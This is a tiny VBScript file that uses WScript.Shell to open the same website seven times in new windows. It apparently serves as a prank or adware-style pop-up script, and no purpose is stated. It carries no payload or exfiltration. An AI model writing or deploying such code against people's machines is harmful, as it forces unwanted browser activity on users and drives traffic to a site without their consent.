Dim wShell 
Set wShell = CreateObject("WScript.Shell") 
wShell.Run "http://professor.norton.net.br",9
wShell.Run "http://professor.norton.net.br",9
wShell.Run "http://professor.norton.net.br",9
wShell.Run "http://professor.norton.net.br",9
wShell.Run "http://professor.norton.net.br",9
wShell.Run "http://professor.norton.net.br",9
wShell.Run "http://professor.norton.net.br",9

